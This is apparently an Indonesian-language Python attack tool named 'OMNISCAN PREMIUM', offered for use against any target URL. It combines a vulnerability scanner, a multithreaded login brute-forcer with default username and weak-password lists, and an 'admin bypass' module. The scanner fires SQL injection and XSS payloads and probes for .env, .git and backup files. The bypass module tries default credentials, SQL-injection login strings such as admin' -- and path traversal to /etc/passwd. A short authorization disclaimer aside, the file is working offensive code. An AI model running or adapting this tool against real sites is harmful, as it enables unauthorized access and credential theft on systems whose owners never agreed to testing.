#!/usr/bin/env python3
# ============================================================
# TOOL: OMNISCAN PREMIUM v6.0
# AUTHOR: frd07
# FUNGSI: Full scanner + Brute Force + Admin Bypass
# ============================================================

import os
import sys
import time
import random
import threading
import socket
import ssl
import re
import json
import itertools
from urllib.parse import urlparse, urljoin, urlencode
from datetime import datetime

# AUTO INSTALL DEPENDENCIES
try:
    from colorama import init, Fore, Style, Back
    import requests
    from tqdm import tqdm
    import dns.resolver
    import whois
except ImportError:
    os.system("pip install colorama requests tqdm dnspython python-whois")
    from colorama import init, Fore, Style, Back
    import requests
    from tqdm import tqdm
    import dns.resolver
    import whois

init(autoreset=True)

# ========== KONFIGURASI ==========
VERSION = "6.0 PREMIUM"
AUTHOR = "frd07"
TEAM = "CYBERLORDS"

# Global variables
results = {
    "sqli": [],
    "xss": [],
    "csrf": [],
    "dirs": [],
    "backup": [],
    "ports_open": [],
    "subdomains": [],
    "security_headers": {},
    "cms": "Unknown",
    "ssl_issues": [],
    "tech_stack": [],
    "admin_panels": [],
    "emails": [],
    "comments": []
}

stop_scan = False
bruteforce_stop = False

# ========== FUNGSI UTILITY ==========
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear()
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
{Fore.RED}║{Fore.CYAN}   ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗ █████╗ ███╗   ██╗{Fore.RED}║
{Fore.RED}║{Fore.CYAN}  ██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██╔══██╗████╗  ██║{Fore.RED}║
{Fore.RED}║{Fore.CYAN}  ██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ███████║██╔██╗ ██║{Fore.RED}║
{Fore.RED}║{Fore.CYAN}  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██╔══██║██║╚██╗██║{Fore.RED}║
{Fore.RED}║{Fore.CYAN}  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████║╚██████╗██║  ██║██║ ╚████║{Fore.RED}║
{Fore.RED}║{Fore.CYAN}   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Fore.RED}║
{Fore.RED}╠══════════════════════════════════════════════════════════════════╣
{Fore.RED}║{Fore.YELLOW}          PREMIUM VULNERABILITY SCANNER + BRUTE FORCE v{VERSION}         {Fore.RED}║
{Fore.RED}║{Fore.GREEN}          Author: {AUTHOR} | Team: {TEAM}                                    {Fore.RED}║
{Fore.RED}║{Fore.MAGENTA}          Auto-scan + Brute Force + Admin Bypass                          {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def loading_animation(text="Loading modules", duration=1.5):
    print(Fore.CYAN + text, end="")
    for _ in range(15):
        time.sleep(0.05)
        print(Fore.CYAN + ".", end="", flush=True)
    print(Fore.GREEN + " DONE!")

def save_report():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_report_{timestamp}.json"
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(Fore.GREEN + f"[✓] Report saved as {filename}")
    return filename

def pause():
    input(Fore.CYAN + "\nPress Enter to continue...")

# ========== EXISTING SCANNING FUNCTIONS (tidak berubah) ==========
def scan_sqli(url):
    print(Fore.CYAN + "[*] Scanning SQL Injection...")
    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1-- -", "1' ORDER BY 1-- -"]
    for payload in tqdm(payloads, desc="SQLi Payloads", leave=False):
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=3, headers={"User-Agent": "OmniScan/6.0"})
            if any(x in r.text.lower() for x in ['sql', 'mysql', 'syntax', 'unclosed', 'warning']):
                results["sqli"].append(payload)
        except:
            pass
    if results["sqli"]:
        print(Fore.RED + f"[!] SQLi vulnerabilities found! {len(results['sqli'])} payloads")
    else:
        print(Fore.GREEN + "[✓] No SQLi detected")

def scan_xss(url):
    print(Fore.CYAN + "[*] Scanning XSS...")
    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
    for payload in tqdm(payloads, desc="XSS Payloads", leave=False):
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=3)
            if payload in r.text:
                results["xss"].append(payload)
        except:
            pass
    if results["xss"]:
        print(Fore.RED + f"[!] XSS vulnerabilities found! {len(results['xss'])} vectors")
    else:
        print(Fore.GREEN + "[✓] No XSS detected")

def scan_dirs(url):
    print(Fore.CYAN + "[*] Scanning common directories & admin panels...")
    dirs = ["admin", "login", "wp-admin", "administrator", "cpanel", "panel", "dashboard", "phpmyadmin", "backup", "uploads", "config", "api", "vendor", "sql", "backup.zip", "backup.tar.gz", ".git", ".env", "robots.txt", "sitemap.xml"]
    base = url.rstrip('/')
    for d in tqdm(dirs, desc="Directory brute", leave=False):
        test_url = f"{base}/{d}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                results["dirs"].append(test_url)
                if "admin" in d or "login" in d or "panel" in d:
                    results["admin_panels"].append(test_url)
            elif r.status_code == 403:
                results["dirs"].append(f"{test_url} (403 Forbidden)")
        except:
            pass
    if results["dirs"]:
        print(Fore.YELLOW + f"[+] Found {len(results['dirs'])} accessible paths")
    else:
        print(Fore.GREEN + "[✓] No interesting directories found")

def scan_ports(domain):
    print(Fore.CYAN + "[*] Scanning open ports...")
    common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080,8443]
    for port in tqdm(common_ports, desc="Port scanning", leave=False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((domain, port))
            if result == 0:
                results["ports_open"].append(port)
            sock.close()
        except:
            pass
    if results["ports_open"]:
        print(Fore.YELLOW + f"[+] Open ports: {results['ports_open']}")
    else:
        print(Fore.GREEN + "[✓] No common open ports (filtered)")

def scan_subdomains(domain):
    print(Fore.CYAN + "[*] Enumerating subdomains...")
    sublist = ["www", "mail", "ftp", "blog", "shop", "api", "dev", "test", "app", "portal", "admin", "secure", "vpn", "remote", "cloud", "cdn"]
    for sub in tqdm(sublist, desc="Subdomain brute", leave=False):
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            results["subdomains"].append((full, ip))
        except:
            pass
    if results["subdomains"]:
        print(Fore.YELLOW + f"[+] Found {len(results['subdomains'])} subdomains")
    else:
        print(Fore.GREEN + "[✓] No subdomains found")

def check_security_headers(url):
    print(Fore.CYAN + "[*] Checking security headers...")
    try:
        r = requests.get(url, timeout=5)
        headers = r.headers
        important = ["X-Frame-Options", "X-XSS-Protection", "X-Content-Type-Options", "Strict-Transport-Security", "Content-Security-Policy"]
        for h in important:
            results["security_headers"][h] = headers.get(h, "MISSING")
        print(Fore.GREEN + "[✓] Security headers checked")
    except:
        print(Fore.RED + "[!] Failed to fetch headers")

def detect_cms(url):
    print(Fore.CYAN + "[*] Detecting CMS/Technology...")
    cms_signatures = {
        "WordPress": ["wp-content", "wp-includes", "wp-json"],
        "Joomla": ["joomla", "com_content", "media/system"],
        "Drupal": ["drupal", "sites/default", "misc/drupal"],
        "Laravel": ["laravel", "csrf-token", "laravel_session"],
        "Django": ["csrfmiddlewaretoken", "django"],
        "React": ["_next", "react", "jsx"],
        "Vue.js": ["vue", "v-app", "v-container"]
    }
    try:
        r = requests.get(url, timeout=5)
        html = r.text.lower()
        for cms, sigs in cms_signatures.items():
            for sig in sigs:
                if sig in html:
                    results["cms"] = cms
                    break
        server = r.headers.get("Server", "")
        if server:
            results["tech_stack"].append(f"Server: {server}")
        power = r.headers.get("X-Powered-By", "")
        if power:
            results["tech_stack"].append(f"X-Powered-By: {power}")
        print(Fore.GREEN + f"[+] CMS detected: {results['cms']}")
        if results["tech_stack"]:
            print(Fore.YELLOW + f"[+] Tech stack: {', '.join(results['tech_stack'])}")
    except:
        print(Fore.RED + "[!] CMS detection failed")

def check_ssl(domain):
    print(Fore.CYAN + "[*] Checking SSL/TLS...")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                exp_date = cert['notAfter']
                results["ssl_issues"].append(f"Certificate expires: {exp_date}")
                print(Fore.GREEN + "[✓] SSL certificate valid")
    except:
        results["ssl_issues"].append("SSL not available or invalid")
        print(Fore.RED + "[!] SSL issue detected")

def extract_info(url):
    print(Fore.CYAN + "[*] Extracting emails and comments...")
    try:
        r = requests.get(url, timeout=5)
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
        results["emails"] = list(set(emails))
        comments = re.findall(r'<!--(.*?)-->', r.text)
        results["comments"] = comments[:10]
        if results["emails"]:
            print(Fore.YELLOW + f"[+] Found {len(results['emails'])} emails")
        if results["comments"]:
            print(Fore.YELLOW + f"[+] Found {len(results['comments'])} HTML comments")
    except:
        pass

def full_scan(target_url):
    global results
    results = {k: [] if isinstance(v, list) else ({} if isinstance(v, dict) else v) for k, v in results.items()}
    results["cms"] = "Unknown"
    
    print_banner()
    print(Fore.MAGENTA + "\n" + "="*60)
    print(Fore.GREEN + f" Target: {target_url}".center(60))
    print(Fore.MAGENTA + "="*60 + "\n")
    
    parsed = urlparse(target_url)
    domain = parsed.netloc or parsed.path
    base_url = f"{parsed.scheme}://{domain}"
    
    threads = []
    scan_functions = [
        (scan_sqli, target_url),
        (scan_xss, target_url),
        (scan_dirs, base_url),
        (scan_ports, domain),
        (scan_subdomains, domain),
        (check_security_headers, base_url),
        (detect_cms, base_url),
        (check_ssl, domain),
        (extract_info, base_url)
    ]
    
    for func, arg in scan_functions:
        t = threading.Thread(target=func, args=(arg,))
        t.start()
        threads.append(t)
        time.sleep(0.2)
    
    for t in threads:
        t.join()
    
    print(Fore.CYAN + "\n" + "="*60)
    print(Fore.YELLOW + " SCAN COMPLETE - SUMMARY".center(60))
    print(Fore.CYAN + "="*60)
    
    vuln_count = len(results["sqli"]) + len(results["xss"])
    if vuln_count > 0:
        print(Fore.RED + f"[!] CRITICAL VULNERABILITIES: {vuln_count}")
    else:
        print(Fore.GREEN + "[✓] No critical vulnerabilities found")
    
    print(Fore.CYAN + f"[+] Open ports: {len(results['ports_open'])}")
    print(Fore.CYAN + f"[+] Directories found: {len(results['dirs'])}")
    print(Fore.CYAN + f"[+] Subdomains: {len(results['subdomains'])}")
    print(Fore.CYAN + f"[+] Admin panels: {len(results['admin_panels'])}")
    print(Fore.CYAN + f"[+] Emails extracted: {len(results['emails'])}")
    
    filename = save_report()
    print(Fore.MAGENTA + "\n[+] Press Enter to view detailed report or any key to exit...")
    choice = input()
    if choice == "":
        print(json.dumps(results, indent=2, default=str))
        pause()
    else:
        print(Fore.GREEN + "Exiting. Stay safe!")

# ========== FITUR BARU: BRUTE FORCE LOGIN ==========
def brute_force():
    print_banner()
    print(Fore.CYAN + "[ BRUTE FORCE LOGIN ATTACK ]\n")
    print(Fore.YELLOW + "PANDUAN: Alat ini mencoba kombinasi username & password untuk menembus login.\n"
                         "         Gunakan hanya pada sistem yang Anda miliki atau memiliki izin tertulis.\n")
    target_url = input(Fore.YELLOW + "Login URL (contoh: http://target.com/login.php): ").strip()
    if not target_url.startswith(('http://','https://')):
        target_url = 'http://' + target_url
    
    # Pilih mode username
    print(Fore.CYAN + "\n[+] Pilih sumber username:")
    print("1. Default wordlist (admin, user, root, dll)")
    print("2. File teks (satu username per baris)")
    print("3. Custom username (input manual)")
    mode_user = input(Fore.YELLOW + "Pilihan (1/2/3): ").strip()
    usernames = []
    if mode_user == "1":
        usernames = ["admin", "user", "root", "administrator", "test", "guest", "support", "info", "webmaster", "manager", "operator"]
    elif mode_user == "2":
        user_file = input(Fore.YELLOW + "Path file username: ").strip()
        try:
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except:
            print(Fore.RED + "File tidak ditemukan, menggunakan default.")
            usernames = ["admin", "user", "root"]
    else:
        custom = input(Fore.YELLOW + "Masukkan username (pisahkan koma): ").strip()
        usernames = [u.strip() for u in custom.split(',')]
    
    # Pilih mode password
    print(Fore.CYAN + "\n[+] Pilih sumber password:")
    print("1. Default weak passwords (123456, password, dll)")
    print("2. File teks (satu password per baris)")
    print("3. Custom password (input manual)")
    mode_pass = input(Fore.YELLOW + "Pilihan (1/2/3): ").strip()
    passwords = []
    if mode_pass == "1":
        passwords = ["123456", "password", "12345678", "qwerty", "abc123", "admin", "letmein", "welcome", "monkey", "dragon", "master", "login", "pass", "12345", "123456789"]
    elif mode_pass == "2":
        pass_file = input(Fore.YELLOW + "Path file password: ").strip()
        try:
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except:
            print(Fore.RED + "File tidak ditemukan, menggunakan default.")
            passwords = ["123456", "password"]
    else:
        custom = input(Fore.YELLOW + "Masukkan password (pisahkan koma): ").strip()
        passwords = [p.strip() for p in custom.split(',')]
    
    # Parameter form
    user_field = input(Fore.YELLOW + "Nama field username (contoh: username, email, user): ").strip() or "username"
    pass_field = input(Fore.YELLOW + "Nama field password (contoh: password, pass, pwd): ").strip() or "password"
    extra_field = input(Fore.YELLOW + "Field tambahan (opsional, contoh: submit=Login, kosongkan jika tidak ada): ").strip()
    
    # Threading dan delay
    try:
        threads = int(input(Fore.YELLOW + "Jumlah thread (1-50, default 10): ").strip() or "10")
        if threads < 1: threads = 1
        if threads > 50: threads = 50
    except:
        threads = 10
    delay = 0.1  # delay antar request dalam thread
    
    total_combos = len(usernames) * len(passwords)
    print(Fore.CYAN + f"\n[*] Total kombinasi: {total_combos}")
    print(Fore.CYAN + f"[*] Thread: {threads} | Delay: {delay}s\n")
    
    confirm = input(Fore.RED + "[!] LANJUTKAN? Ketik 'YA' untuk memulai: ").strip()
    if confirm != "YA":
        print("Dibatalkan.")
        pause()
        return
    
    found = None
    lock = threading.Lock()
    stop_flag = False
    
    def attempt_login(username, password):
        nonlocal found
        if stop_flag:
            return
        data = {user_field: username, pass_field: password}
        if extra_field:
            if '=' in extra_field:
                k, v = extra_field.split('=', 1)
                data[k] = v
            else:
                data[extra_field] = ""
        try:
            # Detect if login uses POST or GET
            r = requests.post(target_url, data=data, timeout=5, allow_redirects=False)
            # Common success indicators
            if r.status_code in [302, 303] or "dashboard" in r.text.lower() or "welcome" in r.text.lower() or "home" in r.text.lower():
                with lock:
                    if not found:
                        found = (username, password)
                        print(Fore.GREEN + f"\n[SUCCESS] Login berhasil! Username: {username} | Password: {password}")
            else:
                print(Fore.YELLOW + f"[-] Coba: {username}:{password} -> {r.status_code}")
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
    
    def worker(combinations):
        for user, pwd in combinations:
            if stop_flag:
                break
            attempt_login(user, pwd)
            time.sleep(delay)
    
    # Generate all combos
    all_combos = list(itertools.product(usernames, passwords))
    # Split combos for threads
    chunk_size = max(1, len(all_combos) // threads)
    chunks = [all_combos[i:i+chunk_size] for i in range(0, len(all_combos), chunk_size)]
    
    thread_list = []
    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk,))
        t.start()
        thread_list.append(t)
    
    try:
        for t in thread_list:
            t.join()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Brute force dihentikan user.")
        stop_flag = True
    
    if found:
        print(Fore.GREEN + f"\n[✓] Kredensial ditemukan: {found[0]} : {found[1]}")
    else:
        print(Fore.RED + "\n[✗] Tidak ada kombinasi yang berhasil.")
    pause()

# ========== FITUR BARU: ADMIN PANEL PENETRATION ==========
def admin_bypass():
    print_banner()
    print(Fore.CYAN + "[ ADMIN PANEL PENETRATION TEST ]\n")
    print(Fore.YELLOW + "PANDUAN: Mencoba berbagai teknik bypass login pada admin panel.\n"
                         "         Teknik: SQL injection, default credentials, path traversal, dll.\n")
    admin_url = input(Fore.YELLOW + "URL admin panel (contoh: http://target.com/admin): ").strip()
    if not admin_url.startswith(('http://','https://')):
        admin_url = 'http://' + admin_url
    
    print(Fore.CYAN + "\n[*] Memulai pengujian bypass...\n")
    
    # 1. Default credentials
    defaults = [("admin", "admin"), ("admin", "password"), ("administrator", "admin"), ("root", "root"), ("user", "user"), ("test", "test")]
    found_creds = None
    print(Fore.YELLOW + "[1] Mencoba default credentials...")
    for user, pwd in defaults:
        try:
            r = requests.post(admin_url, data={"username": user, "password": pwd, "login": "Login"}, timeout=5, allow_redirects=False)
            if r.status_code in [302, 303] or "dashboard" in r.text.lower() or "welcome" in r.text.lower():
                found_creds = (user, pwd)
                print(Fore.GREEN + f"[+] Berhasil dengan default: {user}:{pwd}")
                break
        except:
            pass
    if not found_creds:
        print(Fore.RED + "[-] Tidak ada default credentials yang berhasil.")
    
    # 2. SQL injection bypass
    print(Fore.YELLOW + "\n[2] Mencoba SQL injection bypass (admin' --, etc)...")
    sqli_payloads = [
        ("admin' --", "anything"),
        ("admin' #", "anything"),
        ("' or '1'='1", "' or '1'='1"),
        ("admin' OR '1'='1", "admin"),
        ("' UNION SELECT 1,2,3--", "pass")
    ]
    sqli_success = False
    for user, pwd in sqli_payloads:
        try:
            data = {"username": user, "password": pwd}
            r = requests.post(admin_url, data=data, timeout=5, allow_redirects=False)
            if r.status_code in [302, 303] or "dashboard" in r.text.lower():
                print(Fore.GREEN + f"[+] SQL injection bypass dengan username: {user}")
                sqli_success = True
                break
        except:
            pass
    if not sqli_success:
        print(Fore.RED + "[-] SQL injection bypass tidak berhasil.")
    
    # 3. Directory traversal pada parameter (jika ada)
    print(Fore.YELLOW + "\n[3] Mencoba path traversal pada parameter...")
    traversal_payloads = ["../", "../../", "../../../etc/passwd", "..\\..\\windows\\win.ini"]
    # Cari parameter GET
    parsed = urlparse(admin_url)
    if parsed.query:
        for payload in traversal_payloads:
            test_url = admin_url + "&" + payload if "?" in admin_url else admin_url + "?" + payload
            try:
                r = requests.get(test_url, timeout=5)
                if "root:" in r.text or "[extensions]" in r.text:
                    print(Fore.GREEN + f"[+] Path traversal possible: {test_url}")
                    break
            except:
                pass
    else:
        print(Fore.CYAN + "    Tidak ada parameter GET untuk diuji.")
    
    # 4. Cek cookie / session prediction
    print(Fore.YELLOW + "\n[4] Memeriksa cookie session...")
    try:
        r = requests.get(admin_url, timeout=5)
        cookies = r.cookies
        if cookies:
            for cookie in cookies:
                if 'admin' in cookie.name.lower() or 'auth' in cookie.name.lower():
                    print(Fore.YELLOW + f"[*] Cookie potensial: {cookie.name}={cookie.value}")
        else:
            print(Fore.CYAN + "    Tidak ada cookie yang ditemukan.")
    except:
        pass
    
    # 5. Cek apakah halaman admin membiarkan akses langsung tanpa login
    print(Fore.YELLOW + "\n[5] Menguji akses langsung ke file admin...")
    sensitive_paths = ["/admin/index.php", "/admin/index.html", "/admin/home.php", "/admin/dashboard.php", "/admin/main.php"]
    base = admin_url.rstrip('/')
    for path in sensitive_paths:
        test_url = base + path
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200 and ("welcome" in r.text.lower() or "dashboard" in r.text.lower()):
                print(Fore.GREEN + f"[+] Akses langsung terbuka: {test_url}")
        except:
            pass
    
    print(Fore.CYAN + "\n[*] Pengujian bypass selesai.")
    pause()

# ========== MAIN MENU ==========
def main():
    while True:
        print_banner()
        menu = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║  {Fore.GREEN}[1] {Fore.YELLOW}START FULL SCAN (All vulnerabilities)                     {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[2] {Fore.YELLOW}View Previous Report                                     {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[3] {Fore.YELLOW}🔓 BRUTE FORCE LOGIN                                     {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[4] {Fore.YELLOW}⚡ ADMIN PANEL PENETRATION (Bypass)                       {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[5] {Fore.YELLOW}About & Credits                                         {Fore.CYAN}║
{Fore.CYAN}║  {Fore.GREEN}[0] {Fore.YELLOW}Exit                                                    {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝
        """
        print(menu)
        choice = input(Fore.MAGENTA + "OMNISCAN> " + Style.RESET_ALL)
        
        if choice == "1":
            print_banner()
            target = input(Fore.YELLOW + "Enter website URL (e.g., http://example.com): ").strip()
            if not target.startswith(('http://','https://')):
                target = 'http://' + target
            full_scan(target)
        elif choice == "2":
            print_banner()
            print(Fore.CYAN + "[*] Available reports:")
            os.system("ls -la scan_report_*.json 2>/dev/null || echo 'No reports found'")
            report_file = input(Fore.YELLOW + "Enter report filename to view: ")
            try:
                with open(report_file, 'r') as f:
                    data = json.load(f)
                    print(json.dumps(data, indent=2, default=str))
            except:
                print(Fore.RED + "File not found or invalid")
            pause()
        elif choice == "3":
            brute_force()
        elif choice == "4":
            admin_bypass()
        elif choice == "5":
            print_banner()
            about = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
{Fore.CYAN}║  OMNISCAN PREMIUM v{VERSION}                                    ║
{Fore.CYAN}║  Author  : {AUTHOR}                                           ║
{Fore.CYAN}║  Team    : {TEAM}                                             ║
{Fore.CYAN}║  Purpose : Educational & Security Testing                     ║
{Fore.CYAN}║  Disclaimer: Use only on authorized systems.                  ║
{Fore.CYAN}║  Iko loves you! 💗                                            ║
{Fore.CYAN}╚════════════════════════════════════════════════════════════╝
            """
            print(about)
            pause()
        elif choice == "0":
            print(Fore.GREEN + "\nThank you for using OMNISCAN. Stay secure! 💕")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid choice")
            time.sleep(1)

if __name__ == "__main__":
    main()